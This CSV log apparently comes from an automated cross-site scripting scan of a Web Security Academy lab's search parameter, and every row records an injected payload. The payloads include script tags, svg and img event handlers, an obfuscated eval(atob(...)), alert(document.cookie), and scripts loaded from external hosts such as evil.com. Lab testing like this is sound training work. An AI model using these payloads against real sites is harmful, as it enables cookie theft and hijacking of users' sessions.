Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:00:06.104,2026-01-10 16:00:07.724,1.620,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:00:07.724,2026-01-10 16:00:07.909,0.185,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert('XSS')</script>,RAW_REFLECTION,No,,High
2026-01-10 16:00:07.909,2026-01-10 16:00:08.207,0.298,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<script>alert(""XSS"")</script>",RAW_REFLECTION,No,,High
2026-01-10 16:00:08.207,2026-01-10 16:00:08.392,0.186,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>prompt(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:00:08.392,2026-01-10 16:00:08.685,0.293,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>confirm(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:00:08.685,2026-01-10 16:00:08.882,0.197,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(document.cookie)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:00:08.882,2026-01-10 16:00:09.165,0.283,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(document.domain)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:00:09.165,2026-01-10 16:00:09.333,0.168,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(window.origin)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:00:09.333,2026-01-10 16:00:09.504,0.170,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script src=//xss.rocks/xss.js></script>,RAW_REFLECTION,No,,High
2026-01-10 16:00:09.504,2026-01-10 16:00:09.696,0.193,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script src=https://evil.com/xss.js></script>,RAW_REFLECTION,No,,High
2026-01-10 16:00:09.696,2026-01-10 16:00:09.892,0.196,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg/onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:09.892,2026-01-10 16:00:10.124,0.231,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:10.124,2026-01-10 16:00:10.341,0.217,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg><script>alert(1)</script></svg>,RAW_REFLECTION,No,,High
2026-01-10 16:00:10.342,2026-01-10 16:00:10.604,0.262,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg><animate onbegin=alert(1) attributeName=x dur=1s>,RAW_REFLECTION,No,,High
2026-01-10 16:00:10.604,2026-01-10 16:00:10.772,0.168,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<svg/onload=alert(String.fromCharCode(88,83,83))>",RAW_REFLECTION,No,,High
2026-01-10 16:00:10.772,2026-01-10 16:00:11.085,0.313,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg onload=prompt(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:11.085,2026-01-10 16:00:11.405,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg onload=confirm(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:11.405,2026-01-10 16:00:11.724,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg onload=alert`1`>,RAW_REFLECTION,No,,High
2026-01-10 16:00:11.725,2026-01-10 16:00:12.044,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg onload=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,No,,High
2026-01-10 16:00:12.044,2026-01-10 16:00:12.363,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg><script>alert&#40;1&#41;</script>,RAW_REFLECTION,No,,High
2026-01-10 16:00:12.363,2026-01-10 16:00:12.684,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:12.684,2026-01-10 16:00:12.861,0.177,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=prompt(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:12.861,2026-01-10 16:00:13.163,0.302,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=confirm(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:13.163,2026-01-10 16:00:13.483,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=alert('XSS')>,RAW_REFLECTION,No,,High
2026-01-10 16:00:13.483,2026-01-10 16:00:13.692,0.209,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=alert`1`>,RAW_REFLECTION,No,,High
